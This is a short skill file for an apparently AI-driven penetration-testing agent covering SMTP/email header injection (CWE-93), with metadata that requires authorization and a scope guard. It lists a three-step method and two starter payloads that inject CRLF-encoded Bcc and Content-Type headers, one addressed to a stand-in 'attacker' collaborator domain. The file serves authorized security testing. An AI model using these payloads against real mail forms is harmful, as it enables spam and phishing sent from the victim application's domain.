---
name: smtp-header-injection
description: >-
  Exploit email/SMTP header injection (CWE-93): inject newlines into a name/subject/recipient
  field that builds an email, adding Bcc/Cc/headers or body to hijack outbound mail (spam,
  phishing from the app's domain). Invoke on contact/invite/reset forms that send mail using
  user-controlled header fields.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-93]
requires: [scope-guard, evidence-recorder]
authorization: required
---

# SMTP / Email Header Injection

## Invoke when
- A user field (from/subject/name/recipient) is placed into email headers server-side.

## Methodology
1. Inject CRLF + an extra header (`Bcc:`) into the controllable field.
2. Confirm delivery to the injected recipient (use an authorized inbox/collaborator).
3. Escalate to full body/MIME injection if headers/body boundary is reachable.

## Starter payloads
- `victim@x.com%0d%0aBcc:attacker@collab.tld`
- `Subject%0d%0aContent-Type: text/html%0d%0a%0d%0a<phish>`.

## False-positive filters
- Mailer libraries that reject newlines in headers block this — confirm the extra recipient/header actually took effect.

## Chains to
- `auth-password-reset-abuse` (mail-flow abuse), `chain-builder`.
